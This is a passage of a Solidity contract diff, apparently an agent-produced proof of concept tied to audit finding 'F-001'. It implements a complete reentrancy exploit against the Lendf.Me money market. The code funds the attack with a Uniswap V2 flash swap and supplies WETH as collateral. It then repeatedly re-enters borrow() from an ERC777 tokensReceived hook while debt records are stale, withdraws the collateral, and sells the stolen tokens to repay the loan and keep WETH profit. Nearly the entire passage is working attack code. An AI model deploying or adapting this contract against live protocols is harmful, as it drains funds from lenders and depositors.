+    uint256 internal constant SALE_ITERATIONS = 12;
+
+    enum Mode {
+        Idle,
+        ReenterBorrow
+    }
+
+    Mode internal mode;
+    bool internal attempted;
+    address internal activeToken;
+    address internal flashPair;
+    uint256 internal borrowUnit;
+    uint256 internal remainingBorrowLoops;
+    address internal _profitToken;
+    uint256 internal _profitAmount;
+
+    constructor() {
+        _registerHooks();
+    }
+
+    receive() external payable {}
+
+    function profitToken() external view returns (address) {
+        return _profitToken;
+    }
+
+    function profitAmount() external view returns (uint256) {
+        return _profitAmount;
+    }
+
+    function executeOnOpportunity() external {
+        if (attempted) {
+            return;
+        }
+        attempted = true;
+
+        _registerHooks();
+        _profitToken = address(0);
+        _profitAmount = 0;
+
+        if (!_isSupported(CALLBACK_TOKEN) || !_isSupported(address(WETH))) {
+            return;
+        }
+
+        flashPair = _selectFlashPair();
+        if (flashPair == address(0)) {
+            return;
+        }
+
+        /*
+            Root-cause alignment for F-001:
+            - `withdraw(asset, amount)` transfers out before `supplyBalances[msg.sender][asset]` is reduced.
+            - `borrow(asset, amount)` transfers out before `borrowBalances[msg.sender][asset]` and `market.totalBorrows` are updated.
+            - `supply`, `repayBorrow`, and `liquidateBorrow` call `doTransferIn(...)` before checkpointing state.
+
+            This verifier executes the directly realizable recipient-hook leg:
+            1. Pull temporary WETH through a public Uniswap V2 flashswap.
+            2. Supply that WETH as collateral in Lendf.Me.
+            3. Invoke `borrow(CALLBACK_TOKEN, amount)`.
+            4. Reenter `borrow(...)` from the ERC777 recipient hook while Lendf.Me still reflects stale debt and market totals.
+            5. After only one borrow checkpoint lands, withdraw as much WETH collateral as the under-recorded debt still allows.
+            6. Sell only enough callback token through the existing on-chain Uniswap V1 market to repay the flashswap, leaving WETH profit.
+
+            The flashswap is only funding glue; it does not change exploit causality.
+        */
+        _attemptFlashswap(100 ether);
+        if (_profitAmount >= MIN_REALIZED_WETH_PROFIT) {
+            return;
+        }
+
+        _attemptFlashswap(250 ether);
+        if (_profitAmount >= MIN_REALIZED_WETH_PROFIT) {
+            return;
+        }
+
+        _attemptFlashswap(500 ether);
+    }
+
+    function executeFlashswap(uint256 loanAmount) external {
+        require(msg.sender == address(this), "self-only");
+
+        address pair = flashPair;
+        require(pair != address(0), "pair-missing");
+
+        address token0 = IUniswapV2Pair(pair).token0();
+        address token1 = IUniswapV2Pair(pair).token1();
+
+        uint256 amount0Out = token0 == address(WETH) ? loanAmount : 0;
+        uint256 amount1Out = token1 == address(WETH) ? loanAmount : 0;
+        require(amount0Out != 0 || amount1Out != 0, "weth-not-in-pair");
+
+        IUniswapV2Pair(pair).swap(amount0Out, amount1Out, address(this), abi.encode(loanAmount));
+        _captureProfit();
+    }
+
+    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
+        require(msg.sender == flashPair, "pair-only");
+        require(sender == address(this), "bad-sender");
+
+        uint256 loanAmount = abi.decode(data, (uint256));
+        require(amount0 == loanAmount || amount1 == loanAmount, "bad-loan-amount");
+        require(IERC20Like(address(WETH)).balanceOf(address(this)) >= loanAmount, "missing-loan");
+
+        uint256 repayment = _sameTokenFlashswapRepayment(loanAmount);
+
+        uint256 supplied = _seedCollateral(loanAmount);
+        _reentrantBorrowCallbackToken();
+        _recoverCollateral(supplied);
+        _realizeEnoughWeth(repayment + MIN_REALIZED_WETH_PROFIT);
+
+        _safeTransfer(address(WETH), msg.sender, repayment);
+    }
+
+    function tokensToSend(
+        address,
+        address,
+        address,
+        uint256,
+        bytes calldata,
+        bytes calldata
+    ) external override {}
+
+    function tokensReceived(
+        address,
+        address from,
+        address to,
+        uint256,
+        bytes calldata,
+        bytes calldata
+    ) external override {
+        if (msg.sender != activeToken || mode != Mode.ReenterBorrow) {
+            return;
+        }
+        if (from != address(MONEY_MARKET) || to != address(this)) {
+            return;
+        }
+
+        if (remainingBorrowLoops > 1) {
+            unchecked {
+                remainingBorrowLoops -= 1;
+            }
+
+            bool ok = _tryBorrow(activeToken, borrowUnit);
+            if (!ok) {
+                remainingBorrowLoops = 0;
+                mode = Mode.Idle;
+            }
+        } else {
+            remainingBorrowLoops = 0;
+            mode = Mode.Idle;
+        }
+    }
+
+    function _attemptFlashswap(uint256 loanAmount) internal {
+        (bool ok,) = address(this).call(abi.encodeWithSelector(this.executeFlashswap.selector, loanAmount));
+        if (!ok) {
+            _captureProfit();
+        }
+    }
+
+    function _seedCollateral(uint256 loanAmount) internal returns (uint256 supplied) {
+        supplied = loanAmount;
+        _safeApprove(address(WETH), address(MONEY_MARKET), type(uint256).max);
+        require(_trySupply(address(WETH), supplied), "weth-supply-failed");
+    }
+
+    function _reentrantBorrowCallbackToken() internal {
+        uint256 marketCash = IERC20Like(CALLBACK_TOKEN).balanceOf(address(MONEY_MARKET));
+        require(marketCash > 1, "callback-market-empty");
+
+        uint256 maxSingleBorrow = _approxMaxSingleBorrow(CALLBACK_TOKEN);
+        require(maxSingleBorrow > 0, "no-borrow-headroom");
+
+        uint256 candidate = maxSingleBorrow / 6;
+        uint256 loopBoundedCashUnit = marketCash / TARGET_REENTRY_LOOPS;
+        if (candidate == 0 || (loopBoundedCashUnit != 0 && loopBoundedCashUnit < candidate)) {
+            candidate = loopBoundedCashUnit;
+        }
+        if (candidate == 0) {
+            candidate = maxSingleBorrow / 12;
+        }
+        if (candidate == 0) {
+            candidate = 1;
+        }
+        if (candidate > marketCash) {
+            candidate = marketCash;
+        }
+
+        uint256 loopCount = marketCash / candidate;
+        if (loopCount > MAX_REENTRY_LOOPS) {
+            loopCount = MAX_REENTRY_LOOPS;
+        }
+        require(loopCount >= 2, "insufficient-reentry-room");
+
+        activeToken = CALLBACK_TOKEN;
+        borrowUnit = candidate;
+        remainingBorrowLoops = loopCount;
+        mode = Mode.ReenterBorrow;
+
+        uint256 balanceBefore = IERC20Like(CALLBACK_TOKEN).balanceOf(address(this));
+        bool ok = _tryBorrow(CALLBACK_TOKEN, candidate);
+        mode = Mode.Idle;
+
+        require(ok, "initial-borrow-failed");
+
+        uint256 balanceAfter = IERC20Like(CALLBACK_TOKEN).balanceOf(address(this));
+        require(balanceAfter > balanceBefore + candidate, "borrow-reentry-failed");
+    }
+
+    function _recoverCollateral(uint256 supplied) internal {
+        uint256 remaining = supplied;
+        uint256 chunk = supplied;
+
+        while (remaining > 0 && chunk > 0) {
+            if (chunk > remaining) {
+                chunk = remaining;
+            }
+
+            if (_tryWithdraw(address(WETH), chunk)) {
+                remaining -= chunk;
+                continue;
+            }
+
+            chunk /= 2;
+        }
+    }
+
+    function _realizeEnoughWeth(uint256 targetWethBalance) internal {
+        uint256 wethBalance = IERC20Like(address(WETH)).balanceOf(address(this));
+        if (wethBalance >= targetWethBalance) {
+            return;
+        }
+
+        address exchange = UNISWAP_V1_FACTORY.getExchange(CALLBACK_TOKEN);
+        require(exchange != address(0), "no-uniswap-v1");
+
+        uint256 tokenBalance = IERC20Like(CALLBACK_TOKEN).balanceOf(address(this));
+        require(tokenBalance > 0, "no-callback-profit");
+
+        _safeApprove(CALLBACK_TOKEN, exchange, type(uint256).max);
+
+        uint256 sellChunk = tokenBalance / 4096;
+        if (sellChunk == 0) {
+            sellChunk = 1;
+        }
+
+        for (uint256 i = 0; i < SALE_ITERATIONS; i++) {
+            wethBalance = IERC20Like(address(WETH)).balanceOf(address(this));
+            if (wethBalance >= targetWethBalance) {
+                break;
+            }
+
+            tokenBalance = IERC20Like(CALLBACK_TOKEN).balanceOf(address(this));
+            if (tokenBalance == 0) {
+                break;
+            }
+
+            if (sellChunk > tokenBalance) {
+                sellChunk = tokenBalance;
+            }
+
+            IUniswapV1Exchange(exchange).tokenToEthSwapInput(sellChunk, 1, block.timestamp + 1);
+            _wrapAllEth();
+            sellChunk <<= 1;
+        }
+
+        wethBalance = IERC20Like(address(WETH)).balanceOf(address(this));
+        require(wethBalance >= targetWethBalance, "insufficient-realized-weth");
+    }
+
+    function _wrapAllEth() internal {
+        uint256 ethBalance = address(this).balance;
+        if (ethBalance > 0) {
+            WETH.deposit{value: ethBalance}();
+        }
+    }
+
+    function _captureProfit() internal {
+        _wrapAllEth();
+
+        uint256 wethBalance = IERC20Like(address(WETH)).balanceOf(address(this));
+        if (wethBalance > 0) {
+            _profitToken = address(WETH);
+            _profitAmount = wethBalance;
+            return;
+        }
+
+        uint256 callbackBalance = IERC20Like(CALLBACK_TOKEN).balanceOf(address(this));
+        if (callbackBalance > 0) {
+            _profitToken = CALLBACK_TOKEN;
+            _profitAmount = callbackBalance;
+            return;
+        }
+
+        _profitToken = address(0);
+        _profitAmount = 0;
+    }
+
+    function _selectFlashPair() internal view returns (address bestPair) {
+        address[3] memory candidates = [DAI, USDC, USDT];
+        uint256 bestWethReserve;
+
+        for (uint256 i = 0; i < candidates.length; i++) {
+            address pair = UNISWAP_V2_FACTORY.getPair(address(WETH), candidates[i]);
+            if (pair == address(0)) {
+                continue;
+            }
+
+            uint256 wethReserve = _wethReserve(pair);
+            if (wethReserve > bestWethReserve) {
+                bestWethReserve = wethReserve;
+                bestPair = pair;
+            }
+        }
+    }
+
+    function _wethReserve(address pair) internal view returns (uint256) {
+        (uint112 reserve0, uint112 reserve1,) = IUniswapV2Pair(pair).getReserves();
+        if (IUniswapV2Pair(pair).token0() == address(WETH)) {
+            return uint256(reserve0);
+        }
+        if (IUniswapV2Pair(pair).token1() == address(WETH)) {
+            return uint256(reserve1);
+        }
+        return 0;
+    }
+
+    function _sameTokenFlashswapRepayment(uint256 amountOut) internal pure returns (uint256) {
+        return ((amountOut * 1000) / 997) + 1;
+    }
+
+    function _approxMaxSingleBorrow(address asset) internal view returns (uint256 amount) {
+        int256 liquiditySigned = MONEY_MARKET.getAccountLiquidity(address(this));
+        if (liquiditySigned <= 0) {
+            return 0;
+        }
+
+        uint256 price = MONEY_MARKET.assetPrices(asset);
+        if (price == 0) {
+            return 0;
+        }
+
+        uint256 feeFactor = ONE + MONEY_MARKET.originationFee();
+        uint256 collateralRatioMantissa = MONEY_MARKET.collateralRatio();
+
+        amount = uint256(liquiditySigned);
+        amount = (amount * ONE) / feeFactor;
+        amount = (amount * ONE) / collateralRatioMantissa;
+        amount = (amount * ONE) / price;
+    }
+
+    function _isSupported(address asset) internal view returns (bool) {
+        (bool isSupported,,,,,,,,) = MONEY_MARKET.markets(asset);
+        return isSupported;
+    }
+
+    function _trySupply(address asset, uint256 amount) internal returns (bool) {
+        (bool ok, bytes memory data) =
+            address(MONEY_MARKET).call(abi.encodeWithSelector(IMoneyMarket.supply.selector, asset, amount));
+        return _decodeMoneyMarketCall(ok, data);
+    }
+
+    function _tryWithdraw(address asset, uint256 amount) internal returns (bool) {
+        (bool ok, bytes memory data) =
+            address(MONEY_MARKET).call(abi.encodeWithSelector(IMoneyMarket.withdraw.selector, asset, amount));
+        return _decodeMoneyMarketCall(ok, data);
+    }
+
+    function _tryBorrow(address asset, uint256 amount) internal returns (bool) {
+        (bool ok, bytes memory data) =
+            address(MONEY_MARKET).call(abi.encodeWithSelector(IMoneyMarket.borrow.selector, asset, amount));
+        return _decodeMoneyMarketCall(ok, data);
+    }
+
+    function _decodeMoneyMarketCall(bool ok, bytes memory data) internal pure returns (bool) {
+        if (!ok || data.length < 32) {
+            return false;
+        }
+        return abi.decode(data, (uint256)) == 0;
+    }
+
+    function _safeApprove(address token, address spender, uint256 amount) internal {
+        (bool success, bytes memory data) =
+            token.call(abi.encodeWithSignature("approve(address,uint256)", spender, amount));
+        require(success && (data.length == 0 || abi.decode(data, (bool))), "approve-failed");
+    }
+
+    function _safeTransfer(address token, address to, uint256 amount) internal {
+        (bool success, bytes memory data) =
+            token.call(abi.encodeWithSignature("transfer(address,uint256)", to, amount));
+        require(success && (data.length == 0 || abi.decode(data, (bool))), "transfer-failed");
+    }
+
+    function _registerHooks() internal {
+        ERC1820.setInterfaceImplementer(address(this), TOKENS_SENDER_HASH, address(this));
+        ERC1820.setInterfaceImplementer(address(this), TOKENS_RECIPIENT_HASH, address(this));
+    }
+}
+tokens used
+80,477
